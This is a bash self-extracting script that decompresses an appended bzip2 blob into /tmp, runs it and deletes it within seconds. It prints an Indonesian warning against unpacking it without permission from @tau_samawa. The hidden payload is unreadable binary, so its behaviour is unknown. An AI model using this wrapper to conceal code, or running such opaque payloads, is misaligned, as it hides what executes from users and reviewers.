#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�Tvf ~�TT@ q���?�߮?���P��9�:�WwM�h֍�&��i�S)���OP�=C�4Hh���zy&$d�hh�  h  � $I�iL�<d#��mM� �M2da�a4�h2hɐ�	B�x�Ѧ��@4    ]D���B������^�ej@l`��Q�E���@�@�t�ۯ��NvP @a�H�M�fx_q�>	3��X���O�D�"C��-���Qӊ3�T��C*qZ���mP�r�׾���DN/��ANk� u�o��k��Pm�b�U������$�F.��<�0HU�HQ*A�!�(�-+@�%���+E0a�	;b����q(��Cq�ZCۺ;�h�t��t�J��D_���S�ӫ��³�0@�"�H����\�.����VN��k���E8f�{���kX��֚'̰`�a$�3ŉ��<�$*ŭ3�w���N�C�V����Oϲ��w��*#o𾤮8[�]W�=Z ���F�Bb[�Q⚏e��A>��J��j��5��ȷ�������&h��v�>.Swc%����|�:6�R�k��D �D*!ad��ƀ���
�t���!n[,��̓"����匫]�*�.t�z�z�"a�x���xuH
2���E�9�V���4B77*�p�̈́���<���6\�킕�z���{`�dc�����&�*Yq�
 �����O�Y�)�@�P�� �x��dr��Cw�[K�#�E
&���.�f8OT�'iA_�V1ߚ>_,eq����U\��1W%�^�	���̮�f�(�����[N�f�ȶ�4^.��<� �g�Ih��*"5�Y�����P=��ٷös�b����fA�&�U<���0A�-K{V���E����W'i�ĭ9�hS�bL��b�
3�L�TXH��ixP#����zޚ��S��0�h'5Y�����!���H��:�}�I9�$KL�-H�;9ģ,�)�UZ	b�J�a��?CF������k���E�5U�ZR�5$�K���T.^�$M��1Lz�P2~"{%��PI�tY!!YL�f�bL�	��DAk�x�q��m�0m���[=r�LE�������Z�8lT:e<�;��]�Z� �r� �l�&�䤃(>Ui��c��0D.�q%a3�������N
���yrު���_nhvqkhg��뢩@����0Q]�Y��ao\"!*��U����rI�Z��"�tf�ښ���Є^�(�R�Ɲ� �l��KC.s}���@��B.�4R�y���@�4_�W��eʒ���R����_���z�&4��E$^"Taz��1n���k	bɑY
��H�
*���